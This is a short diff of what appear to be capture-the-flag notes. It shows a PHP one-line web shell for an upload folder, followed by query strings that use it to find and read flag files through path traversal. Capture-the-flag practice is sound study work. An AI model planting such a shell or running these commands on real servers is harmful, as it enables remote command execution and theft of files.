@@ -3,10 +3,10 @@ web shell oneliner (must end w/ .php)
 ```php
 $ <?php echo system($_GET["cmd"]); ?>
 ```
-in path `/uploads/____/test.php?cmd=`
+in provided path `/uploads/____/`
 ```j
-find+../../+-name+*flag*`
-cat+../../*/*flag*
+foo.php?cmd=find+../../+-name+*flag*
+foo.php?cmd=cat+../../*/*flag*
 ```
 
 ## Simple Question of Logic 1
